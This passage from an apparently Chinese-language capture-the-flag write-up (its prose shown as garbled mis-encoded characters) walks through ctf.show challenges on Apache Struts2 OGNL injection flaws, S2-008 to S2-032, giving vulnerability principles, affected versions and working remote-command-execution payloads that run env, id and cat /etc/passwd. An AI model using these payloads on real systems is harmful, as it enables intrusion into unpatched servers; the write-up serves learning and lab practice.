æ‰€æè¿™ç§æƒ…å†µåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å‡ ä¹ä¸å¯èƒ½å­˜åœ¨ï¼Œå› æ­¤å°±å˜å¾—å¾ˆé¸¡è‚‹çš„ï¼Œä½†æˆ‘è®¤ä¸ºä¹Ÿä¸æ˜¯ç»å¯¹çš„ï¼Œä¸‡ä¸€è¢«é»‘äº†ä¸“é—¨ä¸¢äº†ä¸€ä¸ªå¼€å¯äº† debug æ¨¡å¼çš„åº”ç”¨åˆ°æœåŠ¡å™¨ä¸Šä½œä¸ºåé—¨ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„</p><p><strong>å§¿åŠ¿1</strong></p><p>è™½ç„¶åœ¨struts2æ²¡æœ‰å¯¹æ¶æ„ä»£ç è¿›è¡Œé™åˆ¶ï¼Œä½†æ˜¯javaçš„webserverï¼ˆTomcatï¼‰ï¼Œå¯¹cookieçš„åç§°æœ‰è¾ƒå¤šé™åˆ¶ï¼Œåœ¨ä¼ å…¥struts2ä¹‹å‰å°±è¢«å¤„ç†ï¼Œä»è€Œè¾ƒä¸ºé¸¡è‚‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:(<span class="string">&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Aluvion; (<span class="string">&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Twings;</span><br></pre></td></tr></table></figure><p>æ²¡æµ‹è¯•æˆåŠŸã€‚</p><p><strong>å§¿åŠ¿2</strong></p><p>å¼€å¯äº†è°ƒè¯•æ¨¡å¼ï¼Œä½†æ˜¯è°ƒè¯•æ¨¡å¼ä¸­å­˜åœ¨ OGNL è¡¨è¾¾å¼æ³¨å…¥æ¼æ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%<span class="number">22</span>%<span class="number">5D</span>%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%<span class="number">28</span>%22false%<span class="number">22</span>%<span class="number">29</span>%<span class="number">20</span>%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span>%23foo%2C<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString</span>%<span class="number">28</span><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%27env%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>)</span><br></pre></td></tr></table></figure><p>æƒ³è¦ä¿®æ”¹å•¥ï¼Œè¿˜æ˜¯æŠŠenvæ¢æ‰å°±è¡Œã€‚</p><p>è¿™é¢˜ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨å·¥å…·è¿›è¡Œæ±‚è§£</p><h2 id="web283-S2-009"><a href="#web283-S2-009" class="headerlink" title="web283-S2-009"></a>web283-S2-009</h2><p>é¢˜ç›®</p><p>æç¤ºï¼š<strong>Struts2 showcaseè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong></p><p>æµ‹è¯•ç¯å¢ƒæ˜¯ä¸€ä¸ªstruts2çš„â€œåŠŸèƒ½å±•ç¤ºâ€ç½‘ç«™<code>Struts Showcase</code>ï¼Œä»£ç å¾ˆå¤šï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å»æ‰¾ä¸€ä¸ªæ¥å—äº†å‚æ•°ï¼Œå‚æ•°ç±»å‹æ˜¯stringçš„action</p><p><img src="../images/image-20230222114920873.png" alt="image-20230222114920873"></p><p><code>url/S2-009/ajax/example5.action</code>å³å¯è®¿é—®æ§åˆ¶å™¨</p><p><img src="../images/image-20230222115312683.png" alt="image-20230222115312683"></p><p>å†™å…¥payloadåï¼Œä¼šè‡ªåŠ¨ä¸‹è½½ä¸€ä¸ªexample.actionæ–‡ä»¶ï¼Œç„¶åæ‰“å¼€</p><p><img src="../images/image-20230222115455895.png" alt="image-20230222115455895"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±åªéœ€è¦ä¿®æ”¹payloadé‡Œçš„<strong>whoami</strong>æ¢æˆ<strong>env</strong>å°±èƒ½æ‹¿åˆ°flagäº†</p><p>è¿™é‡Œçš„è¯ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·</p><p>ä½†æ˜¯å·¥å…·åªèƒ½æŸ¥å‡ºæ˜¯å“ªä¸ªæ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªå·¥å…·ä¸æ”¯æŒæ¼æ´åˆ©ç”¨</p><h2 id="web284-S2-012"><a href="#web284-S2-012" class="headerlink" title="web284-S2-012"></a>web284-S2-012</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230222203744432.png" alt="image-20230222203744432"></p><p>ç”±é¢˜ç›®å¯çŸ¥è¿™æ˜¯ä¸ªç¼–å·ä¸ºS2-012çš„æ¼æ´</p><p><strong>æ¼æ´åŸç†</strong></p><p>å¦‚æœåœ¨é…ç½® Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-012&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;user&quot;</span> class=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;redirect&quot;</span> type=<span class="string">&quot;redirect&quot;</span>&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;input&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;result name=<span class="string">&quot;success&quot;</span>&gt;/index.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ UserAction ä¸­å®šä¹‰æœ‰ä¸€ä¸ª name å˜é‡ï¼Œå½“è§¦å‘ redirect ç±»å‹è¿”å›æ—¶ï¼ŒStruts2 è·å–ä½¿ç”¨ ${name} è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹ name å‚æ•°çš„å€¼æ‰§è¡Œ OGNL è¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„ OGNL è¡¨è¾¾å¼å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p><p>å½±å“ç‰ˆæœ¬: 2.1.0 - 2.3.13</p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/etc/passwd&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230222204310623.png" alt="image-20230222204310623"></p><p>æ‰§è¡Œåä¼šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶ååªéœ€è¦ä¿®æ”¹ä¸€ä¸‹æ‰§è¡Œå‘½ä»¤(env)å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web285-S2-013"><a href="#web285-S2-013" class="headerlink" title="web285-S2-013"></a>web285-S2-013</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230222204630266.png" alt="image-20230222204630266"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Struts2 æ ‡ç­¾ä¸­ &lt;s:a&gt; å’Œ &lt;s:url&gt; éƒ½åŒ…å«ä¸€ä¸ª includeParams å±æ€§ï¼Œå…¶å€¼å¯è®¾ç½®ä¸º noneï¼Œget æˆ– allï¼Œå‚è€ƒå®˜æ–¹å…¶å¯¹åº”æ„ä¹‰å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">none - é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼ï¼ˆé»˜è®¤ï¼‰</span><br><span class="line">get - é“¾æ¥åªåŒ…å« GET è¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼</span><br><span class="line">all - é“¾æ¥åŒ…å« GET å’Œ POST æ‰€æœ‰å‚æ•°å’Œå…¶å€¼</span><br><span class="line">&lt;s:a&gt;ç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªè¶…é“¾æ¥ï¼Œå½“includeParams=allçš„æ—¶å€™ï¼Œä¼šå°†æœ¬æ¬¡è¯·æ±‚çš„GETå’ŒPOSTå‚æ•°éƒ½æ”¾åœ¨URLçš„GETå‚æ•°ä¸Šã€‚åœ¨æ”¾ç½®å‚æ•°çš„è¿‡ç¨‹ä¸­ä¼šå°†å‚æ•°è¿›è¡ŒOGNLæ¸²æŸ“ï¼Œé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>).getInputStream(),#b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),#d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#c.read(#d),#out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ–</span></span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>S2-014 æ˜¯å¯¹ S2-013 ä¿®å¤çš„åŠ å¼ºï¼Œåœ¨ S2-013 ä¿®å¤çš„ä»£ç ä¸­å¿½ç•¥äº† ${ognl_exp} OGNL è¡¨è¾¾å¼æ‰§è¡Œçš„æ–¹å¼ï¼Œå› æ­¤ S2-014 æ˜¯å¯¹å…¶çš„è¡¥ä¸åŠ å¼º</p><p>è¿™é‡Œçš„è¯è¿˜æ˜¯env   ä½†æ˜¯å¾—æŠŠpocè¿›è¡Œurlå…¨ç¼–ç </p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4e4c3c86-4fbd-4809-8809-8fffe7c3461d.challenge.ctf.show/S2-013/link.action?a=%24%7B%28%23%5F%6D%65%6D%62%65%72%41%63%63%65%73%73%5B%22%61%6C%6C%6F%77%53%74%61%74%69%63%4D%65%74%68%6F%64%41%63%63%65%73%73%22%5D%3D%74%72%75%65%2C%23%61%3D%40%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%40%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%27%65%6E%76%27%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%2C%23%62%3D%6E%65%77%20%6A%61%76%61%2E%69%6F%2E%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61%64%65%72%28%23%61%29%2C%23%63%3D%6E%65%77%20%6A%61%76%61%2E%69%6F%2E%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2C%23%64%3D%6E%65%77%20%63%68%61%72%5B%35%30%30%30%30%5D%2C%23%63%2E%72%65%61%64%28%23%64%29%2C%23%6F%75%74%3D%40%6F%72%67%2E%61%70%61%63%68%65%2E%73%74%72%75%74%73%32%2E%53%65%72%76%6C%65%74%41%63%74%69%6F%6E%43%6F%6E%74%65%78%74%40%67%65%74%52%65%73%70%6F%6E%73%65%28%29%2E%67%65%74%57%72%69%74%65%72%28%29%2C%23%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%23%64%29%2C%23%6F%75%74%2E%63%6C%6F%73%65%28%29%29%7D</span><br></pre></td></tr></table></figure><h2 id="web286-S2-015"><a href="#web286-S2-015" class="headerlink" title="web286-S2-015"></a>web286-S2-015</h2><p>é¢˜ç›®</p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´äº§ç”Ÿäºé…ç½®äº† Action é€šé…ç¬¦ *ï¼Œå¹¶å°†å…¶ä½œä¸ºåŠ¨æ€å€¼æ—¶ï¼Œè§£ææ—¶ä¼šå°†å…¶å†…å®¹æ‰§è¡Œ OGNL è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼š</span><br><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">&quot;S2-015&quot;</span> extends=<span class="string">&quot;struts-default&quot;</span>&gt;</span><br><span class="line">    &lt;action name=<span class="string">&quot;*&quot;</span> class=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span><br><span class="line">        &lt;result&gt;/&#123;<span class="number">1</span>&#125;.jsp&lt;/result&gt;</span><br><span class="line">    &lt;/action&gt;</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®èƒ½è®©æˆ‘ä»¬è®¿é—® name.action æ—¶ä½¿ç”¨ name.jsp æ¥æ¸²æŸ“é¡µé¢ï¼Œä½†æ˜¯åœ¨æå– name å¹¶è§£ææ—¶ï¼Œå¯¹å…¶æ‰§è¡Œäº† OGNL è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚åœ¨å®è·µå¤ç°çš„æ—¶å€™å‘ç°ï¼Œç”±äº name å€¼çš„ä½ç½®æ¯”è¾ƒç‰¹æ®Šï¼Œä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦å¦‚ / â€œ \ éƒ½æ— æ³•ä½¿ç”¨ï¼ˆè½¬ä¹‰ä¹Ÿä¸è¡Œï¼‰ï¼Œæ‰€ä»¥åœ¨åˆ©ç”¨è¯¥ç‚¹è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ—¶ä¸€äº›å¸¦æœ‰è·¯å¾„çš„å‘½ä»¤å¯èƒ½æ— æ³•æ‰§è¡ŒæˆåŠŸ</p><p>è¿˜æœ‰éœ€è¦è¯´æ˜çš„å°±æ˜¯åœ¨ Struts 2.3.14.1 - Struts 2.3.14.2 çš„æ›´æ–°å†…å®¹ä¸­ï¼Œåˆ é™¤äº† SecurityMemberAccess ç±»ä¸­çš„ setAllowStaticMethodAccess æ–¹æ³•ï¼Œå› æ­¤åœ¨ 2.3.14.2 ç‰ˆæœ¬ä»¥åéƒ½ä¸èƒ½ç›´æ¥é€šè¿‡ #_memberAccess[â€˜allowStaticMethodAccessâ€™]=true æ¥ä¿®æ”¹å…¶å€¼è¾¾åˆ°é‡è·é™æ€æ–¹æ³•è°ƒç”¨çš„èƒ½åŠ›</p><p>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.14.2</p><p><strong>æµ‹è¯•æ¼æ´</strong></p><p><img src="../images/image-20230222210606236.png" alt="image-20230222210606236"></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>,#q&#125;.action</span><br></pre></td></tr></table></figure><p>å¾—è¦urlå…¨ç¼–ç å¹¶ä¸”å°†idæ”¹ä¸ºenv</p><h2 id="web287-S2-016"><a href="#web287-S2-016" class="headerlink" title="web287-S2-016"></a>web287-S2-016</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223200203561.png" alt="image-20230223200203561"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åœ¨struts2ä¸­ï¼ŒDefaultActionMapperç±»æ”¯æŒä»¥&quot;action:&quot;ã€â€œredirect:â€ã€&quot;redirectAction:&quot;ä½œä¸ºå¯¼èˆªæˆ–æ˜¯é‡å®šå‘å‰ç¼€ï¼Œä½†æ˜¯è¿™äº›å‰ç¼€åé¢åŒæ—¶å¯ä»¥è·ŸOGNLè¡¨è¾¾å¼ï¼Œç”±äºstruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€åšè¿‡æ»¤ï¼Œå¯¼è‡´åˆ©ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨javaé™æ€æ–¹æ³•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ï¼Œè®¿é—®http://your-ip:8080/default.action?redirect:OGNLè¡¨è¾¾å¼å³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15</span><br></pre></td></tr></table></figure><p>poc</p><p><strong>æ‰§è¡Œå‘½ä»¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%<span class="number">24</span>%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%3Dfalse%2C%<span class="number">23f</span>%<span class="number">3D</span>%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%<span class="number">22</span>)%2C%<span class="number">23f</span>.setAccessible(<span class="literal">true</span>)%2C%<span class="number">23f</span>.set(%23_memberAccess%2Ctrue)%2C%23a%<span class="number">3D</span>%40java.lang.Runtime%40getRuntime().exec(%22env%<span class="number">22</span>).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%<span class="number">23d</span>%3Dnew%20char%5B5000%<span class="number">5D</span>%2C%23c.read(%<span class="number">23d</span>)%2C%23genxor%<span class="number">3D</span>%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>).getWriter()%2C%23genxor.println(%<span class="number">23d</span>)%2C%23genxor.flush()%2C%23genxor.close()%<span class="number">7D</span></span><br></pre></td></tr></table></figure><h2 id="web288-S2-019"><a href="#web288-S2-019" class="headerlink" title="web288-S2-019"></a>web288-S2-019</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223201046125.png" alt="image-20230223201046125"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åŠ¨æ€æ–¹æ³•è°ƒç”¨çš„é»˜è®¤å¯ç”¨ï¼ŒåŸç†ç±»ä¼¼äºs2-008</span><br><span class="line"></span><br><span class="line">Apache Struts 2çš„â€œDynamic Method Invocationâ€æœºåˆ¶æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä»…æé†’ç”¨æˆ·å¦‚æœå¯èƒ½çš„æƒ…å†µä¸‹å…³é—­æ­¤æœºåˆ¶ï¼Œè¿™æ ·å°±å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´åœ¨å—å½±å“åº”ç”¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ä»£ç </span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&#x27;id&#x27;</span>)).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#out=#context.get(<span class="string">&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;</span>),#out.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()</span><br><span class="line"><span class="comment">// åˆ©ç”¨æ˜¯å…ˆè¿›è¡Œurlç¼–ç     </span></span><br></pre></td></tr></table></figure><p>ä¸s2-008pocåŒºåˆ«ä¸åŒçš„ä»…ä»…æ˜¯ç”±åŸå…ˆçš„[â€œallowStaticMethodAccessâ€]=trueé™æ€æ–¹æ³•æ‰§è¡Œæ”¹ä¸º(new java.lang.ProcessBuilder(â€˜idâ€™)).start()ï¼Œä½†è¯¥æ–¹æ³•åœ¨è™šç©ºæµªå­å¿ƒæå‡ºs2-012åä¸ä¹…å°±åœ¨åšå®¢é‡Œè¯´æ˜äº†å®˜æ–¹ä¿®è¡¥æ–¹æ¡ˆå°†allowStaticMethodAccesså–æ¶ˆäº†åçš„æ›¿è¡¥æ–¹æ³•å°±æ˜¯ä½¿ç”¨ava.lang.ProcessBuilder</p><p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.15.1</p><p>è¿™é‡Œçš„è¯å’Œ<strong>web286</strong>ä¸€æ ·ï¼Œå¾—è¿›è¡Œshellåå¼¹ï¼Œç°åœ¨è¿˜ä¸ä¼šï¼Œå…ˆç•™ç€ã€‚</p><h2 id="web289-S2-029"><a href="#web289-S2-029" class="headerlink" title="web289-S2-029"></a>web289-S2-029</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223213512376.png" alt="image-20230223213512376"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Strutsæ¡†æ¶è¢«å¼ºåˆ¶æ‰§è¡Œæ—¶ï¼Œå¯¹åˆ†é…ç»™æŸäº›æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡ŒåŒé‡è¯„ä¼°ï¼Œå› æ­¤å¯ä»¥ä¼ å…¥ä¸€ä¸ªå€¼ï¼Œå½“ä¸€ä¸ªæ ‡ç­¾çš„å±æ€§å°†è¢«æ¸²æŸ“æ—¶ï¼Œè¯¥å€¼å°†è¢«å†æ¬¡è¯„ä¼°</span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚ï¼šä»£ç æ‰§è¡Œè¿‡ç¨‹å¤§è‡´ä¸ºå…ˆå°è¯•è·å–valueçš„å€¼ï¼Œå¦‚æœvalueä¸ºç©ºï¼Œé‚£ä¹ˆå°±äºŒæ¬¡è§£é‡Šæ‰§è¡Œäº†nameã€‚å¹¶ä¸”åœ¨æ‰§è¡Œå‰ç»™nameåŠ ä¸Šäº†â€%&#123;&#125;â€ã€‚æœ€ç»ˆé€ æˆäºŒæ¬¡æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.24.1ï¼ˆ2.3.20.3é™¤å¤–ï¼‰</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>.action?message=(%23_memberAccess[<span class="string">&#x27;allowPrivateAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;allowProtectedAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;excludedPackageNamePatterns&#x27;</span>]=%23_memberAccess[<span class="string">&#x27;acceptProperties&#x27;</span>],%23_memberAccess[<span class="string">&#x27;excludedClasses&#x27;</span>]=%23_memberAccess[<span class="string">&#x27;acceptProperties&#x27;</span>],%23_memberAccess[<span class="string">&#x27;allowPackageProtectedAccess&#x27;</span>]=<span class="literal">true</span>,%23_memberAccess[<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>)</span><br></pre></td></tr></table></figure><p>è¿™é¢˜ä¹Ÿè¦å¼¹shell</p><h2 id="web290-S2-032"><a href="#web290-S2-032" class="headerlink" title="web290-S2-032"></a>web290-S2-032</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230223214103082.png" alt="image-20230223214103082"></p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2åœ¨å¼€å¯äº†åŠ¨æ€æ–¹æ³•è°ƒç”¨ï¼ˆDynamic Method Invocationï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨method:&lt;name&gt;çš„æ–¹å¼æ¥è°ƒç”¨åå­—æ˜¯&lt;name&gt;çš„æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åå°†ä¼šè¿›è¡ŒOGNLè¡¨è¾¾å¼è®¡ç®—ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%<span class="number">3d</span><span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>,%23res%<span class="number">3d</span>%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%<span class="number">5D</span>),%23w%<span class="number">3d</span>%23res.getWriter(),%23s%3dnew+java.util.Scanner(<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%23parameters.cmd%5B0%<span class="number">5D</span>).getInputStream()).useDelimiter(%23parameters.pp%5B0%<span class="number">5D</span>),%23str%<span class="number">3d</span>%23s.hasNext()%<span class="number">3f</span>%23s.next()%3a%23parameters.ppp%5B0%<span class="number">5D</span>,%23w.print(%23str),%23w.close(),<span class="number">1</span>?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%<span class="number">20</span>&amp;encoding=UTF-<span class="number">8</span>&amp;cmd=id</span><br></pre></td></tr></table></figure><h2 id="web291-S2-033"><a href="#web291-S2-033" class="headerlink" 